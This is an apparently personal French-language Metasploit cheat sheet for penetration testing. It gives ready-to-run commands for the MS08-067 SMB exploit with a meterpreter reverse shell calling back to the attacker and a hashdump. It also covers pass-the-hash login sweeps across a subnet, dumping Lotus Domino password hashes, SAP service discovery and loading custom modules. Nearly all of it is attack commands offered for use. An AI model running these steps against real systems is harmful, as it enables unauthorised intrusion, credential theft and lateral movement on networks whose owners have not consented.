## metasploit

### db

```
db_status
db_import scan_syn_all_ports.xml
db_nmap -iL ips.txt …
hosts
services -u
creds
vulns
loots
```


### Modules

#### exploit/windows/smb/ms08_067_netapi

Particulièrement efficace si on trouve encore du Windows Server 2003.

```
use exploit/windows/smb/ms08_067_netapi
set rhost <victimIP>
set payload windows/meterpreter/reverse_tcp
set lhost <ourIP>
set lport 443
check
exploit -j -z
sessions -i
whoami
hashdump
```


#### smblogin

```
search smb
use auxiliary/scanner/smb/smb_login
show options
set SMBUser LocalAdmin
set SMBPass ab459302c0e103…<LM Hash>…323:19282b…<NT hash>…7e7w8
set RHOSTS 192.168.1.0/24
exploit
```

* `Could not connect` : l'hôte ne répond pas sur le port nécessaire ?
* `Correct credentials, but unable to login: 'WORKSTATION\LocalAdmin:<LM hash>:<NT hash>', Login Failed: The server responded with error: STATUS_TYPE_NOT_GRANTED (Command=115 WordCount=0)`: l'hôte répond mais n'autorise pas la connexion à distance avec un compte d'admin local ?
* `Failed: 'WORKSTATION\LocalAdmin:P@$$w0rd', Login Failed The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)`: l'hôte répond mais le mot de passe est incorrect ?


#### domino / lotus notes

Récupérer les versions sans compte :

```
use auxiliary/scanner/lotus/lotus_domino_version
set rhosts
set rport
set ssl
run
```

Dumper les hashes avec un compte :
Fonctionne si le names.nsf est accessible.
```
use auxiliary/scanner/lotus/lotus_domino_hashes
```


#### SAP

Modules intéressants sans compte :

```
use auxiliary/scanner/sap/sap_service_discovery
use auxiliary/scanner/sap/sap_icf_public_info
```



### add external scripts

```
$ pwd
/home/user/.msf4/modules/auxiliary/scanner/http
$ ls
juniper_scan.rb
```

Si un msfconsole est en cours, un coup de `reload_all` et le tour est joué !




